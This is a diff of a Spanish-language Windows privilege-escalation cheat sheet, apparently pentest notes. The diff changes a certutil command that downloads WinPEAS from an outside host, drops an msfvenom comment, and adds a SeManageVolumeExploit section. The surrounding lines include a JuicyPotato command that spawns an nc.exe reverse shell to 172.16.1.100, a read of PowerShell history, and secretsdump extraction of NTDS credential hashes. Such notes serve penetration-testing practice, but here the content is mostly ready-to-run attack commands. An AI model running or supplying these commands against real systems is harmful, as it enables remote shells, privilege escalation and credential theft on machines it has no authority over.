@@ -40,10 +40,9 @@ Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_hi
 ```
 
 
-
 - Descargar
 ```powershell
-certutil.exe -f -urlcache -split http://10.10.14.10/WinPeas.exe Winpeas.exe
+certutil.exe -f -urlcache -split http://10.10.14.20/WinPeas.exe Winpeas.exe
 ```
 
 	## always Install elevated
@@ -67,7 +66,7 @@ https://github.com/wh0amitz/PetitPotato/releases/download/v1.0.0/PetitPotato.exe
 
 .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\priv\nc.exe -e cmd 172.16.1.100 8081"
 
-#Creas una shell.exe con msfvenom
+
 .\Juicy.Potato.x86.exe -t * -p shell.exe -l 1338 -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
 ```
 
@@ -111,6 +110,13 @@ secretsdump.py -system system.save -ntds ntds.dit LOCAL
 ```
 
 
+## SeManageVolumeExploit  -> SeChangeNotifyPrivilege
+Cuando este activado el SeChangeNotifyPrivilege y tambien este como permiso el SeManageVolumeExploit.
+
+```bash
+https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public
+```
+Ejecutas el EXE
 ## RDP SCAR DATA
 
 - Crear el ps1 y ejecutar
